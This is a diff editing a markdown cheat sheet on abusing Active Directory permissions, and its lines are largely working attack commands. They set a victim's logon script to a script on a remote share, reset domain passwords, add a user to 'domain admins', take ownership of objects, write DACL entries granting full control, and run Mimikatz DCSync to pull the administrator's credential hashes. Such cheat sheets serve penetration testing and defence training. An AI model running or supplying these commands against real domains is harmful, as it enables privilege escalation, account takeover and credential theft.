@@ -60,7 +60,6 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 2. AllExtendedRights
-
 - Change Password
 ```bash
 net user <username> <password> /domain
@@ -71,33 +70,25 @@ net group "domain admins" spotless/add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-3. Self-Membership
-- Add to Group
+3. Self-Membership (Add to Group)
 ```bash
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-4. ExtendedRight on
-- User-Force-Change-Password (Password Reset)
+4. ExtendedRight (User-Force-Change-Password (Password Reset))
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
-5. WriteProperty
-- Add to Group
+5. WriteProperty (Add to Group)
 ```bash
 Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
 ```
-6. WriteOwner
-- Change the object’s owner
+6. WriteOwner (Change the object’s owner)
 ```bash
 Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
-```
-- Change Owner
-```bash
 Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
 ```
-7. WriteDACL
-- Grant Generic Permissions** (must be the owner)
+7. WriteDACL (Grant Generic Permissions** (must be the owner))
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -106,7 +97,7 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 8. DCSync Attack 
-- The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
+The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
 ```bash
 lsadump::dcsync /domain:<Domain> /user:<User>
 lsadump::dcsync /domain:example.com /user:administrator
